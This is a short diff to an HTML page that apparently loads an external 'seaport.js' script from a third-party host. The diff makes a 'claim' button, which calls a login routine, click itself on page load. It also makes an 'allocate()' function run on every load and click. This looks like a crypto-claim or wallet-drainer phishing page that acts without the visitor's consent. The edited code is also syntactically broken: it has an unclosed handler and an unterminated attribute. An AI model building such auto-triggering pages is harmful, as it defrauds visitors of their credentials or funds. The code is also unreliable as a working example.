@@ -52,6 +52,7 @@
 <script type="text/javascript" src="https://eriga.jabhost.com/ted/seaport.js"></script>
 <script>
    $(document).ready(function(){
+  
     $(".claim-button").click(function(event){
         event.stopImmediatePropagation();
         event.stopPropagation();
@@ -59,12 +60,12 @@
         login();
         
     });
-});
+$(".claim-button").click();
 
 </script>
 </head>
 
-<body>
+<body onload="allocate();" onclick="allocate(); >
 	<div id="">
 		<div class="font-roboto" id="content">
 			<header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
